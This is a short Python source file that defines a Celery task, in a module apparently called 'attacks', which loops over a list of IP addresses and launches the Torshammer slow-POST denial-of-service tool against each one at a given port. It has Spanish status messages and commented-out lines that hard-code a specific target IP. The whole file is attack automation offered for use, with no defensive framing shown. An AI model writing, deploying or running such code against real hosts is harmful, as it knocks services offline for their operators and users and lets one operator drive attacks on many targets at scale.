#
from __future__ import absolute_import
from pexpect import pxssh
import time
import subprocess as sp
import time
import os
import random
import signal
import subprocess
from attacks.celery import app


@app.task
def torshammer(ip_addresses, port):
    for ip_address in ip_addresses:
       
       
       
        #140.30.20.5
      #  command = "python2.7 torshammer.py -t {} -p {} -r 80000".format("140.30.20.5", port)
      #  os.system(command)
        
        #command = ["python2.7", "torshammer.py", "-t", "140.30.20.5", "-p", str(port), "-r", "260"]
        command = ["python2.7", "torshammer.py", "-t", str(ip_address), "-p", str(port), "-r", "260"]
        #subprocess.call(command)
        #subprocess.run(command, timeout=60)
        try:
          completed_process = subprocess.run(command, timeout=60)
        except subprocess.TimeoutExpired:
            print("El comando ha excedido el tiempo de espera de 60 segundos.")

        print("El comando ha finalizado.")


        